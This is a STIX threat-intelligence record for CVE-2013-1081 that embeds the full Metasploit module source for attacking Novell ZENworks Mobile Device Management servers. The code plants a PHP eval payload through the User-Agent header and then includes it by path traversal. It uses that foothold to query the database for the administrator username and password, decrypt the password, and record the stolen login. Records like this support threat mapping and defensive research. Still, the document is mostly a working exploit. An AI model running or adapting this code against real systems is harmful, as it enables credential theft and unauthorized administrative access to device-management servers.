{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c423b861-2b64-46d6-ba5f-7617ceddfd7c",
    "created": "2024-08-14T16:29:57.367537Z",
    "modified": "2024-08-14T16:29:57.367541Z",
    "name": "Novell Zenworks Mobile Device Managment Admin Credentials",
    "description": " This module attempts to pull the administrator credentials from a vulnerable Novell Zenworks MDM server. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/novell_mdm_creds.rb",
            "external_id": "novell_mdm_creds.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-1081"
        },
        {
            "source_name": "reference",
            "url": "https://support.microfocus.com/kb/doc.php?id=7011895"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name' => 'Novell Zenworks Mobile Device Managment Admin Credentials',\n      'Description' => %q{\n        This module attempts to pull the administrator credentials from\n        a vulnerable Novell Zenworks MDM server.\n      },\n      'Author' =>\n        [\n          'steponequit',\n          'Andrea Micalizzi (aka rgod)' #zdireport\n        ],\n      'References' =>\n        [\n          ['CVE', '2013-1081'],\n          ['OSVDB', '91119'],\n          ['URL', 'https://support.microfocus.com/kb/doc.php?id=7011895']\n        ],\n      'License' => MSF_LICENSE\n    )\n\n    register_options([\n      OptString.new('TARGETURI', [true, 'Path to the Novell Zenworks MDM install', '/'])\n    ])\n\n    register_advanced_options([\n      OptBool.new('SSL', [true, \"Negotiate SSL connection\", false])\n    ])\n  end\n\n  def setup_session()\n    sess = Rex::Text.rand_text_alpha(8)\n    cmd = Rex::Text.rand_text_alpha(8)\n    res = send_request_cgi({\n      'agent' => \"<?php echo(eval($_GET['#{cmd}'])); ?>\",\n      'method' => \"HEAD\",\n      'uri' => normalize_uri(\"#{target_uri.path}\", \"download.php\"),\n      'headers' => {\"Cookie\" => \"PHPSESSID=#{sess}\"},\n    })\n    return sess,cmd\n  end\n\n  def get_creds(session_id,cmd_var)\n    cmd  = '$pass=mdm_ExecuteSQLQuery('\n    cmd << '\"SELECT UserName,Password FROM Administrators where AdministratorSAKey = 1\"'\n    cmd << ',array(),false,-1,\"\",\"\",\"\",QUERY_TYPE_SELECT);'\n    cmd << 'echo \"\".$pass[0][\"UserName\"].\":\".mdm_DecryptData($pass[0][\"Password\"]).\"\";'\n\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(\"#{target_uri.path}\", \"DUSAP.php\"),\n      'vars_get' => {\n        'language' => \"res/languages/../../../../php/temp/sess_#{session_id}\",\n        cmd_var => cmd\n      }\n    })\n\n    if res.nil?\n      print_error(\"Connection timed out\")\n      return \"\", \"\" # Empty username & password\n    end\n\n    creds = res.body.to_s.match(/.*:\"(.*)\";.*\";/)[1]\n    return creds.split(\":\")\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: 'novellmdm',\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::UNTRIED,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def run_host(ip)\n    print_status(\"Verifying that Zenworks login page exists at #{ip}\")\n    uri = normalize_uri(target_uri.path)\n\n    begin\n      res = send_request_raw({\n        'method' => 'GET',\n        'uri' => uri\n      })\n\n      if (res and res.code == 200 and res.body.to_s.match(/ZENworks Mobile Management User Self-Administration Portal/) != nil)\n        print_status(\"Found Zenworks MDM, Checking application version\")\n        ver = res.body.to_s.match(/<p id=\"version\">Version (.*)<\\/p>/)[1]\n        print_status(\"Found Version #{ver}\")\n        session_id,cmd = setup_session()\n        user,pass = get_creds(session_id,cmd)\n        return if user.empty? and pass.empty?\n        print_good(\"Got creds. Login:#{user} Password:#{pass}\")\n        print_good(\"Access the admin interface here: #{ip}:#{rport}#{target_uri.path}dashboard/\")\n\n        report_cred(ip: ip, port: rport, user: user, password: pass, proof: res.body)\n      else\n        print_error(\"Zenworks MDM does not appear to be running at #{ip}\")\n        return :abort\n      end\n\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n    rescue ::Timeout::Error, ::Errno::EPIPE\n    rescue ::OpenSSL::SSL::SSLError => e\n      return if(e.to_s.match(/^SSL_connect /) ) # strange errors / exception if SSL connection aborted\n    end\n  end\nend\n"
}